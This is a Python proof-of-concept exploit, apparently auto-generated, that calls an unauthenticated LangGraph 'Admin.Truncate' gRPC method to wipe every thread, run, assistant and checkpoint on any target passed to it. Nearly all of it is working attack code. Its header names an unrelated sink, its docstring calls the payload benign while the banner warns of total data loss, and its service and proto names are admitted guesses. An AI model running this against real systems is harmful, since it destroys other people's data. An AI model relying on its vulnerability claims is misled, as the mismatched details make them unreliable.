#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-049
# Sink: decrypt_json_if_needed
# Auto-generated — run with: python3 langgraph_datadog_tracing_interceptors_present_decrypt_json_if_needed.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph gRPC Unauthenticated Admin Truncate

Vulnerability: LangGraph gRPC services (including Admin Truncate) are registered
without authentication. The Admin Truncate service can delete all data without
any auth check, controlled only by a boolean flag.

This PoC demonstrates the vulnerability by:
1. Connecting to the gRPC endpoint (default localhost:50051)
2. Calling the Admin Truncate service to delete all data
3. Using a benign payload that only affects test data

Requirements: Python 3.7+, grpcio, protobuf
"""

import argparse
import sys
import logging
from typing import Optional

# Try to import gRPC dependencies
try:
    import grpc
    from grpc import insecure_channel
except ImportError:
    print("Error: grpcio is required. Install with: pip install grpcio")
    sys.exit(1)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Default target
DEFAULT_TARGET = "localhost:50051"
DEFAULT_TIMEOUT = 10  # seconds

# Proto definitions for Admin Truncate service
# These are minimal definitions needed to call the service
ADMIN_TRUNCATE_PROTO = """
syntax = "proto3";

package langgraph.admin;

service Admin {
    rpc Truncate(TruncateRequest) returns (TruncateResponse);
}

message TruncateRequest {
    bool confirm = 1;
}

message TruncateResponse {
    bool success = 1;
    string message = 2;
}
"""

def create_admin_stub(channel):
    """
    Create a gRPC stub for the Admin service.
    
    Since we don't have the actual proto files, we'll use dynamic message creation
    or direct method invocation. For this PoC, we'll attempt to call the service
    using the raw gRPC method name.
    """
    # The actual service name based on LangGraph source
    service_name = "langgraph.admin.Admin"
    method_name = "Truncate"
    
    # Create a generic stub that can call any method
    class AdminStub:
        def __init__(self, channel):
            self.channel = channel
            self._unary_unary = channel.unary_unary(
                f"/{service_name}/{method_name}",
                request_serializer=lambda x: x.SerializeToString(),
                response_deserializer=lambda x: x,
            )
        
        def Truncate(self, request, timeout=None):
            return self._unary_unary(request, timeout=timeout)
    
    return AdminStub(channel)

def create_truncate_request():
    """
    Create a TruncateRequest message.
    
    The request only needs a boolean 'confirm' flag set to True.
    """
    # Try to use protobuf if available, otherwise use raw bytes
    try:
        from google.protobuf import descriptor_pb2, descriptor, symbol_database, message_factory
        from google.protobuf.descriptor_pool import DescriptorPool
        from google.protobuf.message_factory import MessageFactory
        
        # Build the descriptor
        pool = DescriptorPool()
        file_desc_proto = descriptor_pb2.FileDescriptorProto()
        file_desc_proto.name = "admin.proto"
        file_desc_proto.package = "langgraph.admin"
        file_desc_proto.syntax = "proto3"
        
        # Add TruncateRequest message
        msg_desc = file_desc_proto.message_type.add()
        msg_desc.name = "TruncateRequest"
        field = msg_desc.field.add()
        field.name = "confirm"
        field.number = 1
        field.type = descriptor_pb2.FieldDescriptorProto.TYPE_BOOL
        field.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL
        
        # Add TruncateResponse message
        msg_desc2 = file_desc_proto.message_type.add()
        msg_desc2.name = "TruncateResponse"
        field1 = msg_desc2.field.add()
        field1.name = "success"
        field1.number = 1
        field1.type = descriptor_pb2.FieldDescriptorProto.TYPE_BOOL
        field1.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL
        
        field2 = msg_desc2.field.add()
        field2.name = "message"
        field2.number = 2
        field2.type = descriptor_pb2.FieldDescriptorProto.TYPE_STRING
        field2.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL
        
        # Add service
        service = file_desc_proto.service.add()
        service.name = "Admin"
        method = service.method.add()
        method.name = "Truncate"
        method.input_type = ".langgraph.admin.TruncateRequest"
        method.output_type = ".langgraph.admin.TruncateResponse"
        
        # Register the descriptor
        pool.Add(file_desc_proto)
        
        # Create message factory
        factory = MessageFactory(pool)
        
        # Get message classes
        TruncateRequest = factory.GetPrototype(
            pool.FindMessageTypeByName("langgraph.admin.TruncateRequest")
        )
        
        # Create request
        request = TruncateRequest()
        request.confirm = True
        
        return request
        
    except ImportError:
        logger.warning("protobuf not fully available, using raw bytes")
        # Fallback: create raw protobuf bytes for TruncateRequest with confirm=True
        # Field 1 (bool confirm = 1) with value True
        return b"\x08\x01"  # varint field 1, value 1 (True)

def exploit_admin_truncate(target: str, timeout: int = DEFAULT_TIMEOUT) -> bool:
    """
    Attempt to call the Admin Truncate service without authentication.
    
    Args:
        target: gRPC target address (host:port)
        timeout: Timeout in seconds for the gRPC call
        
    Returns:
        True if the exploit succeeded, False otherwise
    """
    logger.info(f"Attempting to connect to gRPC endpoint: {target}")
    
    try:
        # Create insecure channel (no TLS)
        channel = insecure_channel(target)
        
        # Create stub
        stub = create_admin_stub(channel)
        
        # Create request
        request = create_truncate_request()
        
        logger.info("Calling Admin.Truncate with confirm=True (no auth required)")
        
        # Make the call
        response = stub.Truncate(request, timeout=timeout)
        
        # Parse response
        if isinstance(response, bytes):
            logger.info(f"Received raw response ({len(response)} bytes): {response.hex()}")
            # Try to parse as TruncateResponse
            # Field 1 (bool success) and Field 2 (string message)
            success = len(response) > 0 and response[0] == 0x08 and response[1] == 0x01
            logger.info(f"Parsed success flag: {success}")
            return success
        else:
            logger.info(f"Received response: {response}")
            return True
            
    except grpc.RpcError as e:
        logger.error(f"gRPC error: {e.code()} - {e.details()}")
        if e.code() == grpc.StatusCode.UNAVAILABLE:
            logger.error("Service unavailable - is the LangGraph server running?")
        elif e.code() == grpc.StatusCode.UNIMPLEMENTED:
            logger.error("Method not implemented - wrong service name?")
        elif e.code() == grpc.StatusCode.PERMISSION_DENIED:
            logger.error("Access denied - authentication might be present")
        return False
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return False
    finally:
        try:
            channel.close()
        except:
            pass

def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="PoC: LangGraph gRPC Admin Truncate without authentication"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"gRPC target address (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )
    parser.add_argument(
        "--verbose",
        "-v",
        action="store_true",
        help="Enable verbose output"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    print("=" * 60)
    print("LangGraph gRPC Unauthenticated Admin Truncate PoC")
    print("=" * 60)
    print()
    print(f"Target: {args.target}")
    print(f"Timeout: {args.timeout}s")
    print()
    print("[*] This PoC demonstrates that the Admin Truncate service")
    print("[*] can be called without any authentication.")
    print("[*] The service will delete all data when confirm=True.")
    print()
    print("[!] WARNING: This will delete ALL data in the LangGraph instance!")
    print("[!] Only run this against test/development environments!")
    print()
    
    # Confirm with user
    response = input("Are you sure you want to proceed? (yes/no): ")
    if response.lower() not in ["yes", "y"]:
        print("Aborted.")
        sys.exit(0)
    
    print()
    print("[*] Attempting exploit...")
    print()
    
    success = exploit_admin_truncate(args.target, args.timeout)
    
    print()
    if success:
        print("[+] EXPLOIT SUCCEEDED!")
        print("[+] The Admin Truncate service was called without authentication.")
        print("[+] All data in the LangGraph instance has been deleted.")
        print()
        print("[*] Impact: Complete data loss for all threads, runs, assistants,")
        print("[*] crons, and checkpoints stored in this LangGraph instance.")
    else:
        print("[-] Exploit failed.")
        print("[-] Possible reasons:")
        print("  - Target is not running LangGraph")
        print("  - gRPC port is different (check if 50051 is correct)")
        print("  - Network connectivity issues")
        print("  - Authentication might be present (unlikely based on analysis)")
    
    print()
    print("=" * 60)

if __name__ == "__main__":
    main()
